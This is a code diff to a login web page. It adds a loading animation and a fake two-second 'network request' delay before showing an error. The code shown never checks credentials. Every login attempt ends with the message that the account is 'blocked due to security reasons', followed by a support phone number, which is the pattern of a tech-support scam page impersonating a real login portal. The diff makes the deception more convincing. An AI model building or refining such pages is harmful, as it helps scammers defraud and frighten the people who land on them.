@@ -156,6 +156,13 @@
             text-decoration: underline;
         }
 
+        /* Loading animation styles */
+        #loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
         @media (max-width: 600px) {
             header {
                 padding: 10px 15px;
@@ -190,7 +197,7 @@
         </div>
     </header>
 
-    <div class="container">
+    <div class="container" id="login-container">
         <h2>Log in</h2>
         <form id="loginForm">
             <div id="error-message" class="error" style="display:none;"></div> <!-- Moved above username -->
@@ -211,6 +218,11 @@
                 <a href="#">Forgot username or password?</a>
             </div>
         </form>
+    </div>
+
+    <div id="loading">
+        <img src="/mnt/data/image.png" alt="Loading" width="80" height="80">
+        <h3>Loading...</h3>
     </div>
 
     <div class="signup-link">
@@ -246,13 +258,24 @@
             errorMessage.innerHTML = 'Error Code : 00X47800. <br> Your account has been blocked due to security reasons. <br> Contact Support: <a href="tel:+18444991812"><h3 style="color:black;">+1-844-499-1812</h3></a>';
         }
 
+        // Show loading animation
+        function showLoading() {
+            document.getElementById('login-container').style.display = 'none'; // Hide the form
+            document.getElementById('loading').style.display = 'block'; // Show loading animation
+        }
+
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // Show error message after 2 seconds
+            // Show loading animation
+            showLoading();
+
+            // Simulate a delay (e.g., a network request)
             setTimeout(function() {
-                showErrorMessage();
+                showErrorMessage(); // Show the error message after 2 seconds
+                document.getElementById('loading').style.display = 'none'; // Hide loading animation
+                document.getElementById('login-container').style.display = 'block'; // Show the form again
             }, 2000);
 
             // Save the username if "Remember" is checked
